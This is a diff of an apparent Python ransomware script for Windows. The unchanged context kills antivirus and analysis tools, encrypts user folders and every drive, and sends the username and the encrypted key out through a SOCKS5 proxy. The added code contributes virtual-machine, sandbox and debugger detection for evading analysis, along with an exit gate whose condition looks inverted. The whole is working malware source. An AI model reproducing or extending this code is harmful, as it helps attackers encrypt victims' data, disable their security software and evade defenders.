@@ -338,8 +338,6 @@ def block_processes():
         "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "vboxservice", "wireshark",
         "windasm", "windbg", "wmic", "x32dbg", "x64dbg",
     ]
-
-    
     for proc in blocked_processes:
         execute_command(f"taskkill /f /im \"{proc}\"")
 
@@ -359,16 +357,13 @@ def start_encryption():
     try:
         mlock(key)
         mlock(key_b64)
-        
         encrypted_key = encrypt_key(bytes(key_b64.encode()))
-
         data = {
             "username": getpass.getuser(),
             "id": str(id),
             "date": datetime.now().strftime("%d-%m-%Y"),
             "key": base64.b64encode(encrypted_key).decode(),
         }
-
         proxies = {
             "http": f"socks5h://{YOUR_PROXY}",
             "https": f"socks5h://{YOUR_PROXY}",
@@ -400,7 +395,6 @@ def start_encryption():
             encrypt_directory(
                 os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), bytes(key)
             )
-
             bitmask = ctypes.windll.kernel32.GetLogicalDrives()
             for disk in [
                 f"{letter}:/"
@@ -548,7 +542,6 @@ def disable_AV():
         "tds-3", "teatimer", "tgbbob", "tgbstarter", "tsatudt", "umxagent", "umxcfg", "umxfwhlp", "umxlu", "umxpol", "umxtray", "usrprmpt", "vetmsg9x", "vetmsg", "vptray", "vsaccess", "vsserv", "wcantispy", "win-bugsfix", "winpatrol", "wrsssdk", "xcommsvr", "xfr",
         "xp-antispy", "zegarynka", "zlclient", "winpa'rolex",
     ]
-    
     for proc in AV_processes:
         execute_command(f"taskkill /f /im \"{(proc + ".exe") if not proc.endswith(".dll") else proc}\"")
 
@@ -560,6 +553,131 @@ def disable_all():
     disable_task_manager()
     disable_AV()
 
+def is_vm():
+    try:
+        output = subprocess.check_output(
+            ['wmic', 'computersystem', 'get', 'model'],
+            encoding='utf-8',
+            timeout=3,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
+        if any(
+            vm in output
+            for vm in [
+                'Virtual',
+                'VMware',
+                'VirtualBox',
+                'Hyper-V',
+                'QEMU',
+                'KVM',
+                'Parallels',
+            ]
+        ):
+            return True
+    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+        pass
+    try:
+        output = subprocess.check_output(
+            ['getmac'],
+            encoding='utf-8',
+            timeout=3,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
+        if bool(
+            re.search(
+                r'(00:05:69|00:0C:29|00:50:56|00:1C:14|00:03:FF|00:05:00)', output
+            )
+        ):
+            return True
+    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+        pass
+    paths = [
+        'C:\\\\Program Files\\\\VMware\\\\VMware Tools',
+        'C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions',
+        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys',
+        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys',
+        'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys',
+        'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsSandbox_',
+    ]
+    if any(os.path.exists(path) for path in paths):
+        return True
+    try:
+        if bool(ctypes.windll.kernel32.IsProcessorFeaturePresent(29)):
+            return True
+    except (AttributeError, OSError):
+        pass
+    try:
+        if bool(ctypes.windll.kernel32.IsDebuggerPresent()):
+            return True
+    except (AttributeError, OSError):
+        pass
+    sus_procs = {
+        'vmtoolsd',
+        'vboxservice',
+        'wireshark',
+        'fiddler',
+        'sandboxie',
+        'processhacker',
+    }
+    with ThreadPoolExecutor() as executor:
+        futures = {
+            executor.submit(lambda proc: proc.info.get('name', '').lower(), proc): proc
+            for proc in psutil.process_iter(['name'])
+        }
+        if any(future.result() in sus_procs for future in futures):
+            return True
+    start_time = time.perf_counter()
+    for _ in range(1_000_000):
+        pass
+    if time.perf_counter() - start_time > 0.5:
+        return True
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                             'HARDWARE\\\\DESCRIPTION\\\\System')
+        bios_info = winreg.QueryValueEx(key, 'SystemBiosVersion')[0]
+        if any(vm in bios_info for vm in ['VMWARE', 'VIRTUAL', 'QEMU', 'XEN']):
+            return True
+    except:
+        pass
+        
+    return False
+
+
+def is_debugger_present():
+    debugging_modules = {
+        'pdb',
+        'debugpy',
+        'pydevd',
+        'ipdb',
+        'bdb'
+    }
+    if debugging_modules.intersection(sys.modules):
+        return True
+    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+        return True
+    try:
+        if hasattr(sys, '_getframe') and sys._getframe(1).f_trace is not None:
+            return True
+    except (AttributeError, ValueError):
+        pass    
+    if os.name == 'nt':
+        try:
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                return True
+        except (ImportError, AttributeError):
+            pass         
+    if os.name == 'posix':
+        try:
+            with open('/proc/self/status') as f:
+                for line in f:
+                    if line.startswith('TracerPid:'):
+                        if int(line.split()[1]) != 0:
+                            return True
+                        break
+        except (IOError, ValueError):
+            pass
+    return False
+
 
 dev_mode = True
 if __name__ == "__main__":
@@ -570,6 +688,8 @@ if __name__ == "__main__":
                 None, "runas", sys.executable, " ".join(sys.argv), None, 1
             )
             sys.exit(0)
+    if not (is_vm() and is_debugger_present()):
+        sys.exit(3)
     if not dev_mode:
         set_process_critical()
         freeze_keyboard()
